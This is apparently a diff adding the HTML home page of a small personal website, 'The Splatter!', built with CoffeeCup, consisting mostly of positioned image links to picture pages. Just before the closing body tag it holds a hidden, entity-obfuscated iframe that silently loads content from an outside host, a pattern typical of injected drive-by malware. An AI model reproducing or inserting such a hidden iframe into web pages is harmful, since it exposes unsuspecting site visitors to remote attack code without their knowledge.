@@ -1,0 +1,150 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+<head>
+<meta name="generator" content="CoffeeCup Visual Site Designer, Version 6.0 Build 6 for Windows">
+
+<meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">
+
+<!-- 
+     This Website was created with CoffeeCup Visual Site Designer.
+     Copyright 2009, CoffeeCup Software, Inc.
+     http://www.coffeecup.com
+//-->
+<title> My Website </title>
+
+<style type="text/css">
+.textstyle0 {font-family:Arial;font-weight:bold;font-style:normal;font-size:36pt;text-decoration:none;color:#000000;}
+</style>
+
+<style type="text/css">
+div.Object900 { position:absolute; top:215px; left:110px; z-index:0; }
+div.Object900 table { width: auto; }
+div.Object901 { position:absolute; top:241px; left:819px; z-index:1; }
+div.Object901 table { width: auto; }
+div.Object902 { position:absolute; top:569px; left:120px; z-index:2; }
+div.Object902 table { width: auto; }
+div.Object903 { position:absolute; top:419px; left:820px; z-index:3; }
+div.Object903 table { width: auto; }
+div.Object904 { position:absolute; top:112px; left:288px; z-index:4; }
+div.Object904 table { width: auto; }
+div.Object905 { position:absolute; top:126px; left:302px; z-index:5; }
+div.Object905 table { width: auto; }
+div.Object906 { position:absolute; top:473px; left:294px; z-index:6; }
+div.Object906 table { width: auto; }
+div.Object907 { position:absolute; top:477px; left:298px; z-index:7; }
+div.Object907 table { width: auto; }
+div.Object908 { position:absolute; top:472px; left:470px; z-index:8; }
+div.Object908 table { width: auto; }
+div.Object909 { position:absolute; top:476px; left:474px; z-index:9; }
+div.Object909 table { width: auto; }
+div.Object910 { position:absolute; top:472px; left:645px; z-index:10; }
+div.Object910 table { width: auto; }
+div.Object911 { position:absolute; top:476px; left:649px; z-index:11; }
+div.Object911 table { width: auto; }
+div.Object912 { position:absolute; top:587px; left:295px; z-index:12; }
+div.Object912 table { width: auto; }
+div.Object913 { position:absolute; top:591px; left:299px; z-index:13; }
+div.Object913 table { width: auto; }
+div.Object914 { position:absolute; top:587px; left:470px; z-index:14; }
+div.Object914 table { width: auto; }
+div.Object915 { position:absolute; top:591px; left:474px; z-index:15; }
+div.Object915 table { width: auto; }
+div.Object916 { position:absolute; top:587px; left:647px; z-index:16; }
+div.Object916 table { width: auto; }
+div.Object917 { position:absolute; top:591px; left:651px; z-index:17; }
+div.Object917 table { width: auto; }
+div.Object918 { position:absolute; top:26px; left:394px; z-index:18; }
+div.Object918 table { width: auto; }
+</style>
+
+
+<!-- centering -->
+<style type="text/css">
+body {
+ margin: 0px;
+ padding : 0px;
+ text-align: center;
+ height: 100%;
+ width: 100%;
+ background-image: url('files/mess2.jpg');
+}
+
+
+a:link {
+ color: #ffffff;
+}
+
+
+a:visited  {
+ color: #f8f8f8;
+}
+
+</style>
+<!-- --------- -->
+
+
+
+<!-- centering -->
+<style type="text/css">
+#container { position:relative; margin: 0px auto 0 auto; height: 100%; width:1024px; text-align:left; padding-left:0px;}
+</style>
+
+
+<!-- centering -->
+<!-- --------- -->
+
+</head>
+
+<body  >
+<table style="height:768px;" width="1024" border=0 cellspacing=0 cellpadding=0>
+<tr>
+<td>
+<br>
+</td>
+</tr>
+</table>
+
+<div class="Object900"><a href="index.html" ><img style="border:none;" src="files/IMG_95.jpg"  alt="" width=55 height=55></a></div>
+
+<div class="Object901"><a href="pictures.html" ><img style="border:none;" src="files/IMG_96.jpg"  alt="" width=79 height=85></a></div>
+
+<div class="Object902"><a href="Links.html" ><img style="border:none;" src="files/IMG_97.jpg"  alt="" width=64 height=63></a></div>
+
+<div class="Object903"><a href="Info.html" ><img style="border:none;" src="files/IMG_98.jpg"  alt="" width=68 height=72></a></div>
+
+<div class="Object904"><img style="border:none;" src="files/IMG_99.jpg"  alt="" width=504 height=303></div>
+
+<div class="Object905"><img style="border:none;" src="files/IMG_100.jpg"  alt="" width=475 height=274></div>
+
+<div class="Object906"><img style="border:none;" src="files/IMG_101.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object907"><a href="pictures.html" ><img style="border:none;" src="files/IMG_11.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object908"><img style="border:none;" src="files/IMG_103.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object909"><a href="picture2.html" ><img style="border:none;" src="files/IMG_13.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object910"><img style="border:none;" src="files/IMG_105.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object911"><a href="picture3.html" ><img style="border:none;" src="files/IMG_15.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object912"><img style="border:none;" src="files/IMG_107.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object913"><a href="picture4.html" ><img style="border:none;" src="files/IMG_17.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object914"><img style="border:none;" src="files/IMG_109.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object915"><a href="picture5.html" ><img style="border:none;" src="files/IMG_19.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object916"><img style="border:none;" src="files/IMG_111.jpg"  alt="" width=148 height=89></div>
+
+<div class="Object917"><a href="Picture6.html" ><img style="border:none;" src="files/IMG_21.jpg"  alt="" width=139 height=80></a></div>
+
+<div class="Object918"><table border=0 cellspacing=0 cellpadding=0><tr><td valign="top" align="center"><div class="text-align:center;margin-left:0px;text-indent:0px;"><span class="textstyle0">The Splatter!<br>
+</span></div></td></tr></table></div>
+
+
+<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
+</body>
+</html>
